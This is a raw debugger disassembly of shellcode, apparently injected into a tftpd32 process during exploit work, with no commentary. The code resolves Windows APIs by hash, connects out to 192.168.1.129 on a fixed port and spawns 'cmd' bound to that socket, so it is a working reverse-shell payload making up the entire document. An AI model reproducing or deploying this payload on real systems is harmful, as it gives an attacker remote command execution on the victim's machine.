001B41B4   FC               CLD
001B41B5   E8 82000000      CALL tftpd32-.001B423C
001B41BA   60               PUSHAD
001B41BB   89E5             MOV EBP, ESP
001B41BD   31C0             XOR EAX, EAX
001B41BF   64:8B50 30       MOV EDX, DWORD PTR FS:[EAX+30]
001B41C3   8B52 0C          MOV EDX, DWORD PTR DS:[EDX+C]
001B41C6   8B52 14          MOV EDX, DWORD PTR DS:[EDX+14]
001B41C9   8B72 28          MOV ESI, DWORD PTR DS:[EDX+28]
001B41CC   0FB74A 26        MOVZX ECX, WORD PTR DS:[EDX+26]
001B41D0   31FF             XOR EDI, EDI
001B41D2   AC               LODS BYTE PTR DS:[ESI]
001B41D3   3C 61            CMP AL, 61
001B41D5   7C 02            JL SHORT tftpd32-.001B41D9
001B41D7   2C 20            SUB AL, 20
001B41D9   C1CF 0D          ROR EDI, 0D
001B41DC   01C7             ADD EDI, EAX
001B41DE  ^E2 F2            LOOPD SHORT tftpd32-.001B41D2
001B41E0   52               PUSH EDX
001B41E1   57               PUSH EDI
001B41E2   8B52 10          MOV EDX, DWORD PTR DS:[EDX+10]
001B41E5   8B4A 3C          MOV ECX, DWORD PTR DS:[EDX+3C]
001B41E8   8B4C11 78        MOV ECX, DWORD PTR DS:[ECX+EDX+78]
001B41EC   E3 48            JECXZ SHORT tftpd32-.001B4236
001B41EE   01D1             ADD ECX, EDX
001B41F0   51               PUSH ECX
001B41F1   8B59 20          MOV EBX, DWORD PTR DS:[ECX+20]
001B41F4   01D3             ADD EBX, EDX
001B41F6   8B49 18          MOV ECX, DWORD PTR DS:[ECX+18]
001B41F9   E3 3A            JECXZ SHORT tftpd32-.001B4235
001B41FB   49               DEC ECX
001B41FC   8B348B           MOV ESI, DWORD PTR DS:[EBX+ECX*4]
001B41FF   01D6             ADD ESI, EDX
001B4201   31FF             XOR EDI, EDI
001B4203   AC               LODS BYTE PTR DS:[ESI]
001B4204   C1CF 0D          ROR EDI, 0D
001B4207   01C7             ADD EDI, EAX
001B4209   38E0             CMP AL, AH
001B420B  ^75 F6            JNZ SHORT tftpd32-.001B4203
001B420D   037D F8          ADD EDI, DWORD PTR SS:[EBP-8]
001B4210   3B7D 24          CMP EDI, DWORD PTR SS:[EBP+24]
001B4213  ^75 E4            JNZ SHORT tftpd32-.001B41F9
001B4215   58               POP EAX
001B4216   8B58 24          MOV EBX, DWORD PTR DS:[EAX+24]
001B4219   01D3             ADD EBX, EDX
001B421B   66:8B0C4B        MOV CX, WORD PTR DS:[EBX+ECX*2]
001B421F   8B58 1C          MOV EBX, DWORD PTR DS:[EAX+1C]
001B4222   01D3             ADD EBX, EDX
001B4224   8B048B           MOV EAX, DWORD PTR DS:[EBX+ECX*4]
001B4227   01D0             ADD EAX, EDX
001B4229   894424 24        MOV DWORD PTR SS:[ESP+24], EAX
001B422D   5B               POP EBX
001B422E   5B               POP EBX
001B422F   61               POPAD
001B4230   59               POP ECX
001B4231   5A               POP EDX
001B4232   51               PUSH ECX
001B4233   FFE0             JMP NEAR EAX
001B4235   5F               POP EDI
001B4236   5F               POP EDI
001B4237   5A               POP EDX
001B4238   8B12             MOV EDX, DWORD PTR DS:[EDX]
001B423A  ^EB 8D            JMP SHORT tftpd32-.001B41C9
001B423C   5D               POP EBP
001B423D   68 33320000      PUSH 3233
001B4242   68 7773325F      PUSH 5F327377
001B4247   54               PUSH ESP
001B4248   68 4C772607      PUSH 726774C
001B424D   FFD5             CALL NEAR EBP
001B424F   B8 90010000      MOV EAX, 190
001B4254   29C4             SUB ESP, EAX
001B4256   54               PUSH ESP
001B4257   50               PUSH EAX
001B4258   68 29806B00      PUSH 6B8029
001B425D   FFD5             CALL NEAR EBP
001B425F   50               PUSH EAX
001B4260   50               PUSH EAX
001B4261   50               PUSH EAX
001B4262   50               PUSH EAX
001B4263   40               INC EAX
001B4264   50               PUSH EAX
001B4265   40               INC EAX
001B4266   50               PUSH EAX
001B4267   68 EA0FDFE0      PUSH E0DF0FEA
001B426C   FFD5             CALL NEAR EBP
001B426E   97               XCHG EAX, EDI
001B426F   6A 05            PUSH 5
001B4271   68 C0A80181      PUSH 8101A8C0
001B4276   68 020016A9      PUSH A9160002
001B427B   89E6             MOV ESI, ESP
001B427D   6A 10            PUSH 10
001B427F   56               PUSH ESI
001B4280   57               PUSH EDI
001B4281   68 99A57461      PUSH 6174A599
001B4286   FFD5             CALL NEAR EBP
001B4288   85C0             TEST EAX, EAX
001B428A   74 0C            JE SHORT tftpd32-.001B4298
001B428C   FF4E 08          DEC DWORD PTR DS:[ESI+8]
001B428F  ^75 EC            JNZ SHORT tftpd32-.001B427D
001B4291   68 F0B5A256      PUSH 56A2B5F0
001B4296   FFD5             CALL NEAR EBP
001B4298   68 636D6400      PUSH 646D63
001B429D   89E3             MOV EBX, ESP
001B429F   57               PUSH EDI
001B42A0   57               PUSH EDI
001B42A1   57               PUSH EDI
001B42A2   31F6             XOR ESI, ESI
001B42A4   6A 12            PUSH 12
001B42A6   59               POP ECX
001B42A7   56               PUSH ESI
001B42A8  ^E2 FD            LOOPD SHORT tftpd32-.001B42A7
001B42AA   66:C74424 3C 010>MOV WORD PTR SS:[ESP+3C], 101
001B42B1   8D4424 10        LEA EAX, DWORD PTR SS:[ESP+10]
001B42B5   C600 44          MOV BYTE PTR DS:[EAX], 44
001B42B8   54               PUSH ESP
001B42B9   50               PUSH EAX
001B42BA   56               PUSH ESI
001B42BB   56               PUSH ESI
001B42BC   56               PUSH ESI
001B42BD   46               INC ESI
001B42BE   56               PUSH ESI
001B42BF   4E               DEC ESI
001B42C0   56               PUSH ESI
001B42C1   56               PUSH ESI
001B42C2   53               PUSH EBX
001B42C3   56               PUSH ESI
001B42C4   68 79CC3F86      PUSH 863FCC79
001B42C9   FFD5             CALL NEAR EBP
001B42CB   89E0             MOV EAX, ESP
001B42CD   4E               DEC ESI
001B42CE   56               PUSH ESI
001B42CF   46               INC ESI
001B42D0   FF30             PUSH DWORD PTR DS:[EAX]
001B42D2   68 08871D60      PUSH 601D8708
001B42D7   FFD5             CALL NEAR EBP
001B42D9   BB AAC5E25D      MOV EBX, 5DE2C5AA
001B42DE   68 A695BD9D      PUSH 9DBD95A6
001B42E3   FFD5             CALL NEAR EBP
001B42E5   3C 06            CMP AL, 6
001B42E7   7C 0A            JL SHORT tftpd32-.001B42F3
001B42E9   80FB E0          CMP BL, 0E0
001B42EC   75 05            JNZ SHORT tftpd32-.001B42F3
001B42EE   BB 4713726F      MOV EBX, 6F721347
001B42F3   6A 00            PUSH 0
001B42F5   53               PUSH EBX
001B42F6   FFD5             CALL NEAR EBP

